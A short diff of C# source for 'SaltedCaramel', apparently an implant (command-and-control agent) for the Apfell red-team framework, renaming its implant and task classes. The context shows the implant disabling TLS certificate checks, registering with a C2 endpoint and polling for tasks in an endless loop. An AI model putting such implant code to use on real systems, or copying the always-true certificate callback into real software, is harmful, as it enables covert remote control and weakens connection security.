@@ -16,7 +16,7 @@ namespace SaltedCaramel
             ServicePointManager.ServerCertificateValidationCallback = 
                 delegate { return true; };
 
-            SaltedCaramelImplant implant = new SaltedCaramelImplant();
+            SCImplant implant = new SCImplant();
             implant.uuid = args[2]; // Generated when payload is created in Apfell
             implant.endpoint = args[0] + "/api/v1.3/";
             implant.host = Dns.GetHostName();
@@ -34,7 +34,7 @@ namespace SaltedCaramel
 
             while (true)
             {
-                SaltedCaramelTask task = implant.CheckTasking();
+                SCTask task = implant.CheckTasking();
                 if (task.command != "none")
                 {
                     if (implant.hasAlternateToken() == true)
